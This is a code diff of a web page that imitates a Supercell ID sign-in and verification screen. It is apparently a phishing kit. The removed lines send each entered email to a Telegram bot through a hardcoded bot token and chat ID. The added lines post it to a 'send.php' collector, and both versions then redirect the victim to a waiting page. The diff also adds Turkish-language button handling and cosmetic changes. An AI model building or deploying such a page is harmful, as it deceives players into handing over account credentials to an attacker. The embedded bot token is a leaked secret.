@@ -12,17 +12,37 @@
     async function sendEmailToTelegram(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
-      const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM'; // <-- Insert your bot token here
-      const chatId = '5587800563';     // <-- Insert your chat ID here
-      const message = `Email address: ${email}`;
+      const submitBtn = event.target.querySelector('button[type="submit"]');
       
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      // Butonu devre dışı bırak
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Gönderiliyor...';
       
       try {
-        await fetch(url);
-        window.location.href = 'wait.html'; // Redirect page after code is sent
+        const response = await fetch('send.php', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ email: email })
+        });
+
+        const result = await response.json();
+        
+        if (result.status === 'success') {
+          window.location.href = 'wait.html';
+        } else {
+          alert('Hata: ' + result.message);
+          // Butonu tekrar aktif et
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'SIGN IN';
+        }
       } catch (error) {
-        console.error('Error sending message to Telegram:', error);
+        console.error('Error:', error);
+        alert('Bağlantı hatası: ' + error.message);
+        // Butonu tekrar aktif et
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'SIGN IN';
       }
     }
   </script>
@@ -36,7 +56,6 @@
       <span class="text-gray-700 font-medium">Verify</span>
     </div>
     <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
-      <!-- Adjust the progress bar width as needed (style="width: 50%") -->
       <div class="bg-gradient-to-r from-blue-500 to-green-400 h-2.5 rounded-full" style="width: 50%;"></div>
     </div>
     
@@ -69,13 +88,13 @@
       </p>
       <div class="flex flex-col space-y-3">
         <button
-          class="w-full bg-blue-500 text-white py-3 rounded-lg text-base font-semibold hover:bg-blue-600 active:bg-blue-700"
+          class="w-full bg-blue-500 text-white py-3 rounded-lg text-base font-semibold hover:bg-blue-600 active:bg-blue-700 transition duration-200"
           type="submit"
         >
-          SIGN IN
+                <i class="fas fa-sign-in-alt mr-2"></i> SIGN IN
         </button>
         <button
-          class="w-full border border-gray-300 text-gray-700 py-3 rounded-lg text-base hover:bg-gray-100 active:bg-gray-200"
+          class="w-full border border-gray-300 text-gray-700 py-3 rounded-lg text-base hover:bg-gray-100 active:bg-gray-200 transition duration-200"
           type="button"
           onclick="window.history.back()"
         >
@@ -86,7 +105,7 @@
     
     <!-- Footer Link -->
     <div class="text-center mt-4">
-      <a class="text-blue-500" href="#">Want to register for Supercell ID?</a>
+      <a class="text-blue-500 hover:text-blue-700" href="#">Want to register for Supercell ID?</a>
     </div>
   </div>
 </body>
